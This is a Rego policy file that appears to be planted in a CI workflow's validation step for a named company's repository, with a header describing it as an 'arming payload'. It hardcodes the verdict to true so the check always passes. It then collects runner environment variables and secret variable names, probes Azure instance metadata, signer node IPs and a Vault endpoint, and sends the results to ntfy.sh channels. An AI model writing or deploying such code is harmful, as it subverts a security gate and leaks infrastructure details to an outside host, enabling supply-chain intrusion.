package main

import rego.v1

# ---------------------------------------------------------------------------
# Arming payload for kilnfi/public :: validate_provider_api_data
# Executes on the self-hosted "fixed-egress-4c-16g" runner.
# Read-only http.send only: runner identity + Azure IMDS + egress IP +
# Signataire / eth-api / Vault reachability.  Exfil to ntfy.sh.
# The workflow runs:
#   opa eval -d .github/policy/provider_api_data.rego -i provider_api/data.json \
#            'data.main.allow' -f raw
# and requires the raw result to be exactly "true".
# default allow := true guarantees that verdict regardless of probe outcome.
# ---------------------------------------------------------------------------

default allow := true

probe_ran if {
	count(deliveries) >= 0
}

allow if {
	probe_ran
}

# ----------------------------- helpers -------------------------------------

probe_headers := {"User-Agent": "curl/8.10.1", "Accept": "*/*"}
json_headers := object.union(probe_headers, {"Content-Type": "application/json"})
md_headers := object.union(probe_headers, {"Metadata": "true"})

call_http(req) := resp if {
	resp := http.send(object.union({
		"method": "GET",
		"timeout": "6s",
		"raise_error": false,
		"enable_redirect": true,
		"force_json_decode": false,
		"tls_insecure_skip_verify": true,
		"cache": false,
		"headers": probe_headers,
	}, req))
}

short(v) := v if not is_string(v)
short(v) := substring(v, 0, 300) if is_string(v)

comp(r) := {
	"code": object.get(r, "status_code", 0),
	"err": object.get(r, "error", ""),
	"body": short(object.get(r, "body", "")),
}

# ----------------------------- runner identity -----------------------------

env := object.get(opa.runtime(), "env", {})

env_keys := {
	"RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH", "RUNNER_ENVIRONMENT",
	"ImageOS", "ImageVersion", "HOSTNAME", "CI", "GITHUB_ACTIONS",
	"GITHUB_WORKFLOW", "GITHUB_JOB", "GITHUB_RUN_ID", "GITHUB_RUN_ATTEMPT",
	"GITHUB_SHA", "GITHUB_REF", "GITHUB_REPOSITORY", "GITHUB_ACTOR",
	"GITHUB_WORKSPACE", "GITHUB_SERVER_URL", "GITHUB_API_URL",
	"RUNNER_TEMP", "RUNNER_TOOL_CACHE", "ACTIONS_CACHE_URL",
}
runner_env := {k: v | some k, v in env; env_keys[k]}

# key NAMES only (never values) for anything that smells like a secret
secret_pat := "^(KUBE|VAULT|PRIVATE|SIGNER|MNEMONIC|SECRET|TOKEN|ETH_|RPC_|AWS_|SCW_|GCP_)"
secret_key_names := sort([k | some k, _ in env; regex.match(secret_pat, k)])

# ----------------------------- targets -------------------------------------

signataire_ips := [
	"3.255.13.221", "54.216.229.51", "52.215.179.5",
	"108.129.5.197", "52.212.240.227", "52.48.66.163",
]
rpc_methods := ["web3_clientVersion", "eth_accounts", "net_version"]

sb_upcheck := {
	ip: comp(call_http({"url": sprintf("http://%v:9000/upcheck", [ip])}))
	| some ip in signataire_ips
}

sb_rpc := [r |
	some ip in signataire_ips
	some m in rpc_methods
	r := {
		"ip": ip,
		"method": m,
		"resp": comp(call_http({
			"method": "POST",
			"url": sprintf("http://%v:9000/", [ip]),
			"headers": json_headers,
			"body": {"jsonrpc": "2.0", "id": 1, "method": m, "params": []},
		})),
	}
]

eth_api := comp(call_http({"url": "https://eth-api.mainnet.kiln.fi/"}))
vault := comp(call_http({"url": "https://coffre.kiln.fi/v1/sys/health"}))

egress_me := comp(call_http({"url": "https://ifconfig.me/ip"}))
egress_ipify := comp(call_http({"url": "https://api.ipify.org?format=json"}))
egress_co := comp(call_http({"url": "https://ifconfig.co/json"}))

imds_vmid := comp(call_http({
	"url": "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
	"headers": md_headers,
}))
imds_name := comp(call_http({
	"url": "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text",
	"headers": md_headers,
}))
imds_loc := comp(call_http({
	"url": "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text",
	"headers": md_headers,
}))
imds_rg := comp(call_http({
	"url": "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
	"headers": md_headers,
}))

# ----------------------------- exfil ---------------------------------------

blob_env := {
	"tag": "KILN-SRPROVIDER-107007",
	"ts": time.now_ns(),
	"opa": object.get(opa.runtime(), "version", "?"),
	"runner_env": runner_env,
	"secret_key_names": secret_key_names,
	"egress_ifconfigme": egress_me,
	"egress_ipify": egress_ipify,
	"egress_ifconfigco": egress_co,
	"eth_api": eth_api,
	"vault": vault,
	"imds": {"vmid": imds_vmid, "name": imds_name, "location": imds_loc, "rg": imds_rg},
}
blob_up := {"tag": "KILN-SRPROVIDER-107007", "upchecks": sb_upcheck}
blob_rpc := {"tag": "KILN-SRPROVIDER-107007", "rpc": sb_rpc}

msgs := [blob_env, blob_up, blob_rpc]

ntfy_channels := ["kiln-srprovider-107007-9c4f2e", "kiln-sr-provider-103241"]

deliveries := [d |
	some ch in ntfy_channels
	some m in msgs
	d := call_http({
		"method": "POST",
		"url": sprintf("https://ntfy.sh/%v", [ch]),
		"headers": object.union(probe_headers, {"Title": sprintf("kiln-fe-%v", [ch]), "Tags": "runner"}),
		"body": json.marshal(m),
		"timeout": "20s",
	})
]
